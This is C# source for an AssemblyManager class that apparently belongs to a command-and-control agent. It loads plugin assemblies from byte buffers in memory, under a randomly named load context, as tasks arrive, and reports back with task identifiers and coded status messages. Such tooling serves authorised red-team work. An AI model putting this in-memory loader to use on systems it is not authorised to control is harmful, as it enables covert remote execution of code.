using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Reflection;
using System.Runtime.Loader;

namespace Agent.Managers
{
    public class AssemblyManager : IAssemblyManager
    {
        private ConcurrentDictionary<string, IPlugin> loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
        private AssemblyLoadContext loadContext = new AssemblyLoadContext(Misc.RandomString(10));
        private ILogger logger { get; set; }
        private IMessageManager messageManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private ITokenManager tokenManager { get; set; }
        private ISpawner spawner { get; set; }
        public AssemblyManager(IMessageManager messageManager, ILogger logger, IAgentConfig agentConfig, ITokenManager tokenManager, ISpawner spawner) {
            this.logger = logger;
            this.messageManager = messageManager;
            this.agentConfig= agentConfig;
            this.tokenManager = tokenManager;
            this.spawner = spawner;
        }
        
        private bool TryLoadPlugin(string name, out IPlugin? plugOut)
        {
            plugOut = null;
            try
            {
                Assembly _tasksAsm = Assembly.Load($"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                if(_tasksAsm is null)
                {
                    return false;
                }

                if(ParseAssemblyForPlugin(_tasksAsm))
                {
                    return this.loadedPlugins.TryGetValue(name, out plugOut);
                }
            }
            catch (Exception e)
            {
            }
            return false;

        }

        public bool LoadAssemblyAsync(string task_id, byte[] buf)
        {
            try
            {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));
                messageManager.AddResponse(new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x19" } },
                    completed = true
                });
                return true;
            }
            catch (Exception e)
            {
                messageManager.AddResponse(new TaskResponse
                {
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", "0x19" } },
                    completed = true,
                    user_output = e.ToString(),
                    status = "error",
                });
            }
            return false;
        }
        public bool LoadPluginAsync(string task_id, string pluginName, byte[] buf)
        {
            try {
                var loadedAssembly = this.loadContext.LoadFromStream(new MemoryStream(buf));

                if (this.loadedPlugins.ContainsKey(pluginName))
                {
                    this.messageManager.AddResponse(new LoadTaskResponse
                    {
                        completed = true,
                        process_response = new Dictionary<string, string> { { "message", "0x1C" } },
                        task_id = task_id,
                        status = "error"
                    });
                    return false;
                }

                if (this.ParseAssemblyForPlugin(loadedAssembly))
                {
                    LoadTaskResponse cr = new LoadTaskResponse()
                    {
                        completed = true,
                        //process_response = new Dictionary<string, string> { { "message", "0x1D" } },
                        user_output = $"Loaded plugin {pluginName}",
                        task_id = task_id,
                        commands = new List<CommandsResponse>()
                                {
                                    new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = pluginName,
                                    }
                                }
                    };
                    this.messageManager.AddResponse(cr.ToJson());
                    return true;
                }
            }
            catch (Exception e)
            {
                this.messageManager.AddResponse(new LoadTaskResponse
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x1C" } },
                    task_id = task_id,
                    status = "error",
                    user_output = e.ToString()
                });
            }

            return false;
        }
        private bool ParseAssemblyForPlugin(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                if (typeof(IPlugin).IsAssignableFrom(t))
                {
                    IPlugin plug = (IPlugin)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager, spawner);
                    this.loadedPlugins.GetOrAdd(plug.Name, plug);

                    return true;
                }
            }
            return false;
        }
        public bool TryGetPlugin<T>(string name, out T? plugin) where T : IPlugin
        {
            IPlugin plug = null;


            if(loadedPlugins.TryGetValue(name, out plug) || this.TryLoadPlugin(name, out plug))
            {
                if (plug is T typedPlugin)
                {
                    plugin = typedPlugin;
                    return true;
                }
            }

            plugin = default(T);
            return false;
        }
    }
}
